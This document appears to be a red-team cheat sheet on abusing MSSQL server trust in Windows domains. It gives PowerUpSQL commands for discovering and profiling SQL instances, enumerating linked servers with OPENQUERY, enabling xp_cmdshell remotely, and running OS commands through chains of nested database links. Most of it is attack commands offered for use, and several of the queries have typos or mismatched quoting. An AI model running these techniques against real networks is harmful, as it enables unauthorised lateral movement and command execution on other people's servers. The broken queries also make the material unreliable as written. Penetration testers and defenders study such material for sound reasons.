# Trust Abuse - MSSQL Servers

* mssql servers are usually deployed in a windows domain
* sql servers are a good option for lateral movement as domain users can be mapped to database roles
* use PowerUpSQL (https://github.com/NetSPI/PowerUpSQL)

#### discovery (spn scanning)
```powershell
Get-SQLInstanceDomain
```

#### check accessibility
```powershell
Get-SQLConnectionTestThreaded

Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

#### gather info
```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```


<br>

## mssql servers - database links

* a database link allows a sql server to access external data sources like other sql servers and ole db data sources
* in case of database links between sql servers, that is, linked sql servers it is possible to execute stored procedures
* database links work across forest trust

note: use heidisql for manual testing. opensource tool


### searching database links

#### look for links to remote servers
```powershell
Get-SQLServerLink -Instance mssql-server -Verbose 
```
or 
```
select * from master..sysservers
```

#### enumerating database links manually

* Openquery() function can be used to run queries on a linked database
select * from openquery("mssql-server",'select * from master..syservers')


#### enumarating database links
```powershell
Get-SQLServerLinkCrawl -Instance mssql-server -Verbose
````
or

* Openquery queries can be chained to access links within links (nested links)
```
select * from openquery("mssql-server".'select * from openquery("mgmt-server","select * from master..sysservers")')
```

### executing commands

* on the target server, either xp_cmdshell should be already enabled or
* if rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:
```
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;')AT "parent-sql"
```

#### exec commands
```powershell
Get-SQLServerLinkCrawl -Instance mssql-server -Query "exec master..xp_cmdshell 'whoami'"
```

or

#### from the initial sql server, os commands can be executed using nested link queries
```
select * from openquery("mssql-server",'select * from openquery("mgmt-server","select * from openquery("parent-sql",""select @@version as version;exec master..xp_cmdshell "powershell whoami)"")")')
```





















